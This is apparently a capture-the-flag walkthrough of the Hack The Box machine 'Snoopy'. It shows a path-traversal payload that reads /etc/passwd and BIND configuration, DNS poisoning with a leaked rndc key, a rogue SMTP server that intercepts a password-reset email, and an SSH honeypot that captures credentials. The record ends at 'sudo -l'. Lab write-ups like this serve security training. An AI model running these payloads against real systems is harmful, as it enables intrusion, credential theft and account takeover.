---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - CVE-2023-20052
  - DNS-Poisoning
  - CVE-2023-23946
  - LFI
  - SSH-Honeypot
---
# Overview

| Name        | Snoopy    |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Hard [40] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.229.5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-16 02:21 CDT
Nmap scan report for 10.129.229.5
Host is up (0.076s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[snoopy.png]]

![[snoopy3.png]]
## Zone Transfer

```bash
$ dig axfr snoopy.htb @10.129.229.5

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> axfr snoopy.htb @10.129.229.5
;; global options: +cmd
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 76 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP)
;; WHEN: Thu Oct 16 02:31:42 CDT 2025
;; XFR size: 11 records (messages 1, bytes 325)
```

```bash
sudo tee -a /etc/hosts << EOF
10.129.229.5 snoopy.htb
10.129.229.5 mattermost.snoopy.htb
10.129.229.5 mm.snoopy.htb
10.129.229.5 ns1.snoopy.htb
10.129.229.5 ns2.snoopy.htb
10.129.229.5 postgres.snoopy.htb
10.129.229.5 provisions.snoopy.htb
10.129.229.5 www.snoopy.htb
EOF
```

![[snoopy2.png]]
# Initial Foothold
## LFI

```bash
$ curl "http://snoopy.htb/download?file=....//....//....//....//....//etc/passwd" -o passwd.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   796  100   796    0     0   5173      0 --:--:-- --:--:-- --:--:--  5202

$ unzip passwd.zip 
Archive:  passwd.zip
  inflating: press_package/etc/passwd  

$ cat press_package/etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
lpelt:x:1003:1004::/home/lpelt:/bin/bash
cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
_laurel:x:999:998::/var/log/laurel:/bin/false
```
## DNS Poisoning

```bash
$ # Read the main DNS config
curl "http://snoopy.htb/download?file=....//....//....//....//....//etc/bind/named.conf" -o named.conf.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   495  100   495    0     0   3176      0 --:--:-- --:--:-- --:--:--  3173

$ unzip named.conf.zip
Archive:  named.conf.zip
  inflating: press_package/etc/bind/named.conf  

$ cat press_package/etc/bind/named.conf
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

We can try DNS poisoning now so that mail are redirected to our IP.

```bash
$ cat > rndc.key << 'EOF'
key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
EOF

$ cat > poison_dns.txt << 'EOF'
server 10.129.229.5
zone snoopy.htb
update add mail.snoopy.htb 86400 IN A 10.10.14.122
send
EOF

$ nsupdate -k rndc.key poison_dns.txt

$ dig mail.snoopy.htb @10.129.229.5
;; communications error to 10.129.229.5#53: timed out

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> mail.snoopy.htb @10.129.229.5
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39493
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: f10668a53bb482150100000068f0a2331c37209126b437e5 (good)
;; QUESTION SECTION:
;mail.snoopy.htb.		IN	A

;; ANSWER SECTION:
mail.snoopy.htb.	86400	IN	A	10.10.14.122

;; Query time: 73 msec
;; SERVER: 10.129.229.5#53(10.129.229.5) (UDP)
;; WHEN: Thu Oct 16 02:43:22 CDT 2025
;; MSG SIZE  rcvd: 88
```

We can see that now `mail.snoopy.htb` has our IP which means DNS poisoning worked.

## SMTP

Now setup SMTP server to capture mails.

```python
#!/usr/bin/env python3
import socketserver
import sys

class SMTPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        print(f"Connection from: {self.client_address[0]}")
        self.wfile.write(b"220 snoopy.htb ESMTP\r\n")
        
        while True:
            line = self.rfile.readline().decode().strip()
            if not line:
                break
            print(f"Received: {line}")
            
            if line.startswith("MAIL FROM:"):
                self.wfile.write(b"250 OK\r\n")
            elif line.startswith("RCPT TO:"):
                self.wfile.write(b"250 OK\r\n")
            elif line == "DATA":
                self.wfile.write(b"354 End data with <CR><LF>.<CR><LF>\r\n")
                # Read email data
                email_data = ""
                while True:
                    data_line = self.rfile.readline().decode()
                    if data_line == ".\r\n":
                        break
                    email_data += data_line
                print("=" * 50)
                print("EMAIL CAPTURED:")
                print(email_data)
                print("=" * 50)
                self.wfile.write(b"250 OK\r\n")
            elif line == "QUIT":
                self.wfile.write(b"221 Bye\r\n")
                break
            else:
                self.wfile.write(b"250 OK\r\n")

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 25
    with socketserver.TCPServer((HOST, PORT), SMTPHandler) as server:
        print(f"SMTP server listening on {HOST}:{PORT}")
        server.serve_forever()
```

```bash
$ python3 main.py
SMTP server listening on 0.0.0.0:25
```

Now with SMTP server running we can get mail but for that we would have to trigger it.

1. **Open your browser** and go to: `http://mm.snoopy.htb`
2. **Click "Forgot your password?"**
3. **Enter the email**: `sbrown@snoopy.htb`
4. **Click the reset button**

Note: DNS poisoning might expire so try again if you get sending mail failed in the site.

To verify:

```bash
$ dig mail.snoopy.htb @10.129.229.5 +short
10.10.14.122
```

![[snoopy4.png]]

We receive the mail in our SMTP server with reset link.

```bash
$ python3 main.py
SMTP server listening on 0.0.0.0:25
Connection from: 10.129.229.5
Received: EHLO mm.snoopy.htb
Received: STARTTLS
Received: MAIL FROM:<no-reply@snoopy.htb>
Received: RCPT TO:<sbrown@snoopy.htb>
Received: DATA
==================================================
EMAIL CAPTURED:
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Auto-Submitted: auto-generated
Precedence: bulk
From: "No-Reply" <no-reply@snoopy.htb>
Date: Thu, 16 Oct 2025 07:54:56 +0000
Subject: [Mattermost] Reset your password
Reply-To: "No-Reply" <no-reply@snoopy.htb>
Message-ID: <rzsskbs7w5h5h1py-1760601296@mm.snoopy.htb>
To: sbrown@snoopy.htb
Content-Type: multipart/alternative;
 boundary=247a9fcdd5dafb0b4a8f51e12ba360cec8f21bac6a986b59c2074a726210

--247a9fcdd5dafb0b4a8f51e12ba360cec8f21bac6a986b59c2074a726210
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset=UTF-8

Reset Your Password
Click the button below to reset your password. If you didn=E2=80=99t reques=
t this, you can safely ignore this email.

Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dq9kmn=
jk7euq518nacysim6ikn4ij38rhdeipkpwyop7w9migxau4awn91ct5tqeu )

The password reset link expires in 24 hours.

Questions?
Need help or have questions? Email us at support@snoopy.htb ( support@snoop=
y.htb )

=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA=
, 94301
--247a9fcdd5dafb0b4a8f51e12ba360cec8f21bac6a986b59c2074a726210
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset=UTF-8




<!doctype html>
<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso=
ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">

<head>
  <title>
  </title>
 =20
  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
 =20
  <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">
  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1">
  <style type=3D"text/css">
    #outlook a {
      padding: 0;
    }

    body {
      margin: 0;
      padding: 0;
      -webkit-text-size-adjust: 100%;
      -ms-text-size-adjust: 100%;
    }

    table,
    td {
      border-collapse: collapse;
      mso-table-lspace: 0pt;
      mso-table-rspace: 0pt;
    }

    img {
      border: 0;
      height: auto;
      line-height: 100%;
      outline: none;
      text-decoration: none;
      -ms-interpolation-mode: bicubic;
    }

    p {
      display: block;
      margin: 13px 0;
    }
  </style>
 =20
 =20
 =20
  <link href=3D"https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400=
,500,700" rel=3D"stylesheet" type=3D"text/css">
  <style type=3D"text/css">
    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400=
,500,700);
  </style>
 =20
  <style type=3D"text/css">
    @media only screen and (min-width:480px) {
      .mj-column-per-100 {
        width: 100% !important;
        max-width: 100%;
      }
    }
  </style>
  <style media=3D"screen and (min-width:480px)">
    .moz-text-html .mj-column-per-100 {
      width: 100% !important;
      max-width: 100%;
    }
  </style>
  <style type=3D"text/css">
    @media only screen and (max-width:480px) {
      table.mj-full-width-mobile {
        width: 100% !important;
      }

      td.mj-full-width-mobile {
        width: auto !important;
      }
    }
  </style>
  <style type=3D"text/css">
    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400=
,500,600,700);

    .emailBody {
      background-color: #F3F3F3
    }

    .emailBody a {
      text-decoration: none !important;
      color: #1C58D9;
    }

    .title div {
      font-weight: 600 !important;
      font-size: 28px !important;
      line-height: 36px !important;
      letter-spacing: -0.01em !important;
      color: #3F4350 !important;
      font-family: Open Sans, sans-serif !important;
    }

    .subTitle div {
      font-size: 16px !important;
      line-height: 24px !important;
      color: rgba(63, 67, 80, 0.64) !important;
    }

    .subTitle a {
      color: rgb(28, 88, 217) !important;
    }

    .button a {
      background-color: #1C58D9 !important;
      font-weight: 600 !important;
      font-size: 16px !important;
      line-height: 18px !important;
      color: #FFFFFF !important;
      padding: 15px 24px !important;
    }

    .button-cloud a {
      background-color: #1C58D9 !important;
      font-weight: 400 !important;
      font-size: 16px !important;
      line-height: 18px !important;
      color: #FFFFFF !important;
      padding: 15px 24px !important;
    }

    .messageButton a {
      background-color: #FFFFFF !important;
      border: 1px solid #FFFFFF !important;
      box-sizing: border-box !important;
      color: #1C58D9 !important;
      padding: 12px 20px !important;
      font-weight: 600 !important;
      font-size: 14px !important;
      line-height: 14px !important;
    }

    .info div {
      font-size: 14px !important;
      line-height: 20px !important;
      color: #3F4350 !important;
      padding: 40px 0px !important;
    }

    .footerTitle div {
      font-weight: 600 !important;
      font-size: 16px !important;
      line-height: 24px !important;
      color: #3F4350 !important;
      padding: 0px 0px 4px 0px !important;
    }

    .footerInfo div {
      font-size: 14px !important;
      line-height: 20px !important;
      color: #3F4350 !important;
      padding: 0px 48px 0px 48px !important;
    }

    .footerInfo a {
      color: #1C58D9 !important;
    }

    .appDownloadButton a {
      background-color: #FFFFFF !important;
      border: 1px solid #1C58D9 !important;
      box-sizing: border-box !important;
      color: #1C58D9 !important;
      padding: 13px 20px !important;
      font-weight: 600 !important;
      font-size: 14px !important;
      line-height: 14px !important;
    }

    .emailFooter div {
      font-size: 12px !important;
      line-height: 16px !important;
      color: rgba(63, 67, 80, 0.56) !important;
      padding: 8px 24px 8px 24px !important;
    }

    .postCard {
      padding: 0px 24px 40px 24px !important;
    }

    .messageCard {
      background: #FFFFFF !important;
      border: 1px solid rgba(61, 60, 64, 0.08) !important;
      box-sizing: border-box !important;
      box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.12) !important;
      border-radius: 4px !important;
      padding: 32px !important;
    }

    .messageAvatar img {
      width: 32px !important;
      height: 32px !important;
      padding: 0px !important;
      border-radius: 32px !important;
    }

    .messageAvatarCol {
      width: 32px !important;
    }

    .postNameAndTime {
      padding: 0px 0px 4px 0px !important;
      display: flex;
    }

    .senderName {
      font-family: Open Sans, sans-serif;
      text-align: left !important;
      font-weight: 600 !important;
      font-size: 14px !important;
      line-height: 20px !important;
      color: #3F4350 !important;
    }

    .time {
      font-family: Open Sans, sans-serif;
      font-size: 12px;
      line-height: 16px;
      color: rgba(63, 67, 80, 0.56);
      padding: 2px 6px;
      align-items: center;
      float: left;
    }

    .channelBg {
      background: rgba(63, 67, 80, 0.08);
      border-radius: 4px;
      display: flex;
      padding-left: 4px;
    }

    .channelLogo {
      width: 10px;
      height: 10px;
      padding: 5px 4px 5px 6px;
      float: left;
    }

    .channelName {
      font-family: Open Sans, sans-serif;
      font-weight: 600;
      font-size: 10px;
      line-height: 16px;
      letter-spacing: 0.01em;
      text-transform: uppercase;
      color: rgba(63, 67, 80, 0.64);
      padding: 2px 6px 2px 0px;
    }

    .gmChannelCount {
      background-color: rgba(63, 67, 80, 0.2);
      padding: 0 5px;
      border-radius: 2px;
      margin-right: 2px;
    }

    .senderMessage div {
      text-align: left !important;
      font-size: 14px !important;
      line-height: 20px !important;
      color: #3F4350 !important;
      padding: 0px !important;
    }

    .senderInfoCol {
      width: 394px !important;
      padding: 0px 0px 0px 12px !important;
    }

    @media all and (min-width: 541px) {
      .emailBody {
        padding: 32px !important;
      }
    }

    @media all and (max-width: 540px) and (min-width: 401px) {
      .emailBody {
        padding: 16px !important;
      }

      .messageCard {
        padding: 16px !important;
      }

      .senderInfoCol {
        width: 80% !important;
        padding: 0px 0px 0px 12px !important;
      }
    }

    @media all and (max-width: 400px) {
      .emailBody {
        padding: 0px !important;
      }

      .footerInfo div {
        padding: 0px !important;
      }

      .messageCard {
        padding: 16px !important;
      }

      .postCard {
        padding: 0px 0px 40px 0px !important;
      }

      .senderInfoCol {
        width: 80% !important;
        padding: 0px 0px 0px 12px !important;
      }
    }

    @media only screen and (min-width:480px) {
      .mj-column-per-50 {
        width: 100% !important;
        max-width: 100% !important;
      }
    }
  </style>
</head>

<body style=3D"word-spacing:normal;background-color:#FFFFFF;">
  <div class=3D"emailBody" style=3D"background-color: #FFFFFF;">
   =20
    <div style=3D"background:#FFFFFF;background-color:#FFFFFF;margin:0px au=
to;border-radius:8px;max-width:600px;">
      <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D=
"0" role=3D"presentation" style=3D"background:#FFFFFF;background-color:#FFF=
FFF;width:100%;border-radius:8px;">
        <tbody>
          <tr>
            <td style=3D"direction:ltr;font-size:0px;padding:24px;text-alig=
n:center;">
             =20
              <div style=3D"margin:0px auto;max-width:552px;">
                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell=
spacing=3D"0" role=3D"presentation" style=3D"width:100%;">
                  <tbody>
                    <tr>
                      <td style=3D"direction:ltr;font-size:0px;padding:0px =
0px 40px 0px;text-align:center;">
                       =20
                        <div class=3D"mj-column-per-100 mj-outlook-group-fi=
x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc=
k;vertical-align:top;width:100%;">
                          <table border=3D"0" cellpadding=3D"0" cellspacing=
=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">
                            <tbody>
                              <tr>
                                <td align=3D"center" style=3D"font-size:0px=
;padding:0px;word-break:break-word;">
                                  <table border=3D"0" cellpadding=3D"0" cel=
lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord=
er-spacing:0px;">
                                    <tbody>
                                      <tr>
                                        <td style=3D"width:132px;">
                                          <img alt height=3D"21" src=3D"htt=
p://mm.snoopy.htb/static/images/logo_email_dark.png" style=3D"border:0;disp=
lay:block;outline:none;text-decoration:none;height:21.76px;width:100%;font-=
size:13px;" width=3D"132">
                                        </td>
                                      </tr>
                                    </tbody>
                                  </table>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                       =20
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
             =20
              <div style=3D"margin:0px auto;max-width:552px;">
                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell=
spacing=3D"0" role=3D"presentation" style=3D"width:100%;">
                  <tbody>
                    <tr>
                      <td style=3D"direction:ltr;font-size:0px;padding:0px =
24px 40px 24px;text-align:center;">
                       =20
                        <div class=3D"mj-column-per-100 mj-outlook-group-fi=
x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc=
k;vertical-align:top;width:100%;">
                          <table border=3D"0" cellpadding=3D"0" cellspacing=
=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">
                            <tbody>
                              <tr>
                                <td align=3D"center" class=3D"title" style=
=3D"font-size:0px;padding:0px;word-break:break-word;">
                                  <div style=3D"text-align: center; font-we=
ight: 600; font-size: 28px; line-height: 36px; letter-spacing: -0.01em; col=
or: #3F4350; font-family: Open Sans, sans-serif;">Reset Your Password</div>
                                </td>
                              </tr>
                              <tr>
                                <td align=3D"center" class=3D"subTitle" sty=
le=3D"font-size:0px;padding:16px 24px 16px 24px;word-break:break-word;">
                                  <div style=3D"font-family: Open Sans, san=
s-serif; text-align: center; font-size: 16px; line-height: 24px; color: rgb=
a(63, 67, 80, 0.64);">Click the button below to reset your password. If you=
 didn=E2=80=99t request this, you can safely ignore this email.</div>
                                </td>
                              </tr>
                              <tr>
                                <td align=3D"center" vertical-align=3D"midd=
le" class=3D"button" style=3D"font-size:0px;padding:0px;word-break:break-wo=
rd;">
                                  <table border=3D"0" cellpadding=3D"0" cel=
lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:separate;line=
-height:100%;">
                                    <tr>
                                      <td align=3D"center" bgcolor=3D"#FFFF=
FF" role=3D"presentation" style=3D"border:none;border-radius:4px;cursor:aut=
o;mso-padding-alt:10px 25px;background:#FFFFFF;" valign=3D"middle">
                                        <a href=3D"http://mm.snoopy.htb/res=
et_password_complete?token=3Dq9kmnjk7euq518nacysim6ikn4ij38rhdeipkpwyop7w9m=
igxau4awn91ct5tqeu" style=3D"display: inline-block; background: #FFFFFF; fo=
nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd=
ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: =
#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF=
FF; padding: 15px 24px;" target=3D"_blank">
                                          Reset Password
                                        </a>
                                      </td>
                                    </tr>
                                  </table>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                       =20
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
             =20
              <div style=3D"margin:0px auto;max-width:552px;">
                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell=
spacing=3D"0" role=3D"presentation" style=3D"width:100%;">
                  <tbody>
                    <tr>
                      <td style=3D"direction:ltr;font-size:0px;padding:0px;=
text-align:center;">
                       =20
                        <div class=3D"mj-column-per-100 mj-outlook-group-fi=
x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc=
k;vertical-align:top;width:100%;">
                          <table border=3D"0" cellpadding=3D"0" cellspacing=
=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">
                            <tbody>
                              <tr>
                                <td align=3D"center" style=3D"font-size:0px=
;padding:0px;word-break:break-word;">
                                  <table border=3D"0" cellpadding=3D"0" cel=
lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord=
er-spacing:0px;">
                                    <tbody>
                                      <tr>
                                        <td style=3D"width:312px;">
                                          <img alt height=3D"auto" src=3D"h=
ttp://mm.snoopy.htb/static/images/forgot_password_illustration.png" style=
=3D"border:0;display:block;outline:none;text-decoration:none;height:auto;wi=
dth:100%;font-size:13px;" width=3D"312">
                                        </td>
                                      </tr>
                                    </tbody>
                                  </table>
                                </td>
                              </tr>
                              <tr>
                                <td align=3D"center" class=3D"info" style=
=3D"font-size:0px;padding:0px;word-break:break-word;">
                                  <div style=3D"font-family: Open Sans, san=
s-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F=
4350; padding: 40px 0px;">The password reset link expires in 24 hours.</div=
>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                       =20
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
             =20
             =20
             =20
              <div style=3D"margin:0px auto;max-width:552px;">
                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell=
spacing=3D"0" role=3D"presentation" style=3D"width:100%;">
                  <tbody>
                    <tr>
                      <td style=3D"direction:ltr;font-size:0px;padding:16px=
 0px 40px 0px;text-align:center;">
                       =20
                        <div class=3D"mj-column-per-100 mj-outlook-group-fi=
x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc=
k;vertical-align:top;width:100%;">
                          <table border=3D"0" cellpadding=3D"0" cellspacing=
=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">
                            <tbody>
                              <tr>
                                <td align=3D"center" class=3D"footerTitle" =
style=3D"font-size:0px;padding:0px;word-break:break-word;">
                                  <div style=3D"font-family: Open Sans, san=
s-serif; text-align: center; font-weight: 600; font-size: 16px; line-height=
: 24px; color: #3F4350; padding: 0px 0px 4px 0px;">Questions?</div>
                                </td>
                              </tr>
                              <tr>
                                <td align=3D"center" class=3D"footerInfo" s=
tyle=3D"font-size:0px;padding:0px;word-break:break-word;">
                                  <div style=3D"font-family: Open Sans, san=
s-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F=
4350; padding: 0px 48px 0px 48px;">Need help or have questions? Email us at=
=20
                                    <a href=3D"mailto:support@snoopy.htb" s=
tyle=3D"text-decoration: none; color: #1C58D9;">
                                      support@snoopy.htb</a>
                                  </div>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                       =20
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
             =20
             =20
             =20
              <div style=3D"margin:0px auto;max-width:552px;">
                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell=
spacing=3D"0" role=3D"presentation" style=3D"width:100%;">
                  <tbody>
                    <tr>
                      <td style=3D"direction:ltr;font-size:0px;padding:0px;=
text-align:center;">
                       =20
                        <div class=3D"mj-column-per-100 mj-outlook-group-fi=
x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc=
k;vertical-align:top;width:100%;">
                          <table border=3D"0" cellpadding=3D"0" cellspacing=
=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">
                            <tbody>
                              <tr>
                                <td align=3D"center" class=3D"emailFooter" =
style=3D"font-size:0px;padding:0px;word-break:break-word;">
                                  <div style=3D"font-family: Open Sans, san=
s-serif; text-align: center; font-size: 12px; line-height: 16px; color: rgb=
a(63, 67, 80, 0.56); padding: 8px 24px 8px 24px;">
                                    =C2=A9 2022 Mattermost, Inc. 530 Lytton=
 Avenue, Second floor, Palo Alto, CA, 94301
                                  </div>
                                </td>
                              </tr>
                            </tbody>
                          </table>
                        </div>
                       =20
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
             =20
            </td>
          </tr>
        </tbody>
      </table>
    </div>
   =20
  </div>
</body>

</html>


--247a9fcdd5dafb0b4a8f51e12ba360cec8f21bac6a986b59c2074a726210--
```

The reset link in the email is:

```
http://mm.snoopy.htb/reset_password_complete?token=3Dq9kmnjk7euq518nacysim6ikn4ij38rhdeipkpwyop7w9migxau4awn91ct5tqeu
```

The `=3D` is quoted-printable encoding for `=`. We need to decode this:

**Decoded URL:**

```
http://mm.snoopy.htb/reset_password_complete?token=q9kmnjk7euq518nacysim6ikn4ij38rhdeipkpwyop7w9migxau4awn91ct5tqeu
```

Go to the link and reset the password to `test1234`.

![[snoopy5.png]]

Reset the password and login with creds `sbrown@snoopy.htb:test1234`.
## `mm.snoopy.htb`

![[snoopy6.png]]

Found this interesting `/server_provisions` command in chat that we can use which pops-up a request form for server provision.

![[snoopy7.png]]

After putting our `tun0` IP and submitting the form (You can just put random email in username `test@snoopy.htb`).

```bash
$ nc -nlvp 2222
listening on [any] 2222 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.229.5] 36322
SSH-2.0-paramiko_3.1.0

ls
```

We get connection but it disconnects very quickly. The connection is from `paramiko` (Python SSH library), so we need something that can handle SSH authentication.
## SSH Honeypot

```bash
pip3 install honeypots
```

```bash
$ honeypots --setup ssh:2222 --options capture_commands
[INFO] For updates, check https://github.com/qeeqbox/honeypots
[WARNING] Using system or well-known ports requires higher privileges (E.g. sudo -E)
[INFO] Use [Enter] to exit or python3 -m honeypots --kill
[INFO] Parsing honeypot [normal]
{"action": "process", "dest_ip": "0.0.0.0", "dest_port": "2222", "server": "ssh_server", "src_ip": "0.0.0.0", "src_port": "2222", "status": "success", "timestamp": "2025-10-16T08:20:36.270429"}
[INFO] servers ssh running...
[INFO] Everything looks good!
```

Now send that form again using `/server_provision` like before.

```bash
$ honeypots --setup ssh:2222 --options capture_commands
[INFO] For updates, check https://github.com/qeeqbox/honeypots
[WARNING] Using system or well-known ports requires higher privileges (E.g. sudo -E)
[INFO] Use [Enter] to exit or python3 -m honeypots --kill
[INFO] Parsing honeypot [normal]
{"action": "process", "dest_ip": "0.0.0.0", "dest_port": "2222", "server": "ssh_server", "src_ip": "0.0.0.0", "src_port": "2222", "status": "success", "timestamp": "2025-10-16T08:20:36.270429"}
[INFO] servers ssh running...
[INFO] Everything looks good!
{"action": "connection", "dest_ip": "0.0.0.0", "dest_port": "2222", "server": "ssh_server", "src_ip": "10.129.229.5", "src_port": "55444", "timestamp": "2025-10-16T08:21:16.170758"}
{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "2222", "password": "sn00pedcr3dential!!!", "server": "ssh_server", "src_ip": "10.129.229.5", "src_port": "55444", "status": "failed", "timestamp": "2025-10-16T08:21:16.637695", "username": "cbrown"}
```

We got SSH creds.
# Lateral Movements
## SSH `cbrown` => `sbrown`

```bash
$ ssh cbrown@snoopy.htb

cbrown@snoopy.htb password: sn00pedcr3dential!!!
cbrown@snoopy:~$ 
```

```bash
cbrown@snoopy:~$ cd /home
cbrown@snoopy:/home$ ls
cbrown  sbrown
cbrown@snoopy:/home$ cd sbrown
-bash: cd: sbrown: Permission denied
cbrown@snoopy:/home$ sudo -l
